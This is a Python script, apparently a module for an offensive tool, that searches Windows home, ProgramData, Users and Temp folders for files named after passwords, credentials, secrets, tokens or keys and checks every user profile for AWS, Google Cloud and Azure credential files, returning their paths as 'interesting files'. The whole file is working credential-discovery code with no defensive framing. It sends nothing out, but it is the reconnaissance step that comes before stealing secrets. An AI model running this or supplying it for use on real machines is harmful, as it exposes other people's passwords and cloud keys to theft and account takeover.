import os

# List of keywords to search for in filenames
keywords = [
    "password", "passwords", "credential", "credentials", "secret", "secrets",
    "login", "logins", "account", "accounts", "key", "keys", "access", "token", "tokens"
]

# List of file extensions to check
extensions = [".txt", ".docx", ".xlsx", ".csv", ".json", ".xml", ".ini", ".conf", ".log"]

# Directories to search
directories_to_search = [
    os.path.expanduser("~"),
    "C:\\ProgramData",
    "C:\\Users",
    "C:\\Temp",
    "C:\\Windows\\Temp"
]

# Specific cloud provider credential files
cloud_credential_patterns = [
    "{user_home}\\.aws\\credentials",
    "{user_home}\\.config\\gcloud\\credentials.db",
    "{user_home}\\.azure\\azureProfile.json"
]

def search_files():
    matches = set()

    # Search for general keyword files
    for dir_to_search in directories_to_search:
        for root, _, filenames in os.walk(dir_to_search):
            for filename in filenames:
                if any(keyword in filename.lower() for keyword in keywords) and any(filename.lower().endswith(ext) for ext in extensions):
                    matches.add(os.path.join(root, filename))
    
    # Search for specific cloud provider credential files
    for user_dir in os.listdir("C:\\Users"):
        user_home = os.path.join("C:\\Users", user_dir)
        if os.path.isdir(user_home):
            for pattern in cloud_credential_patterns:
                credential_path = pattern.format(user_home=user_home)
                if os.path.isfile(credential_path):
                    matches.add(credential_path)
    
    return list(matches)

def search():
    try:
        found_files = search_files()
        if found_files:
            return "Interesting files found:\n" + "\n".join(found_files)
        else:
            return "No interesting files found."
    except Exception as e:
        return f"Error searching for files: {str(e)}"
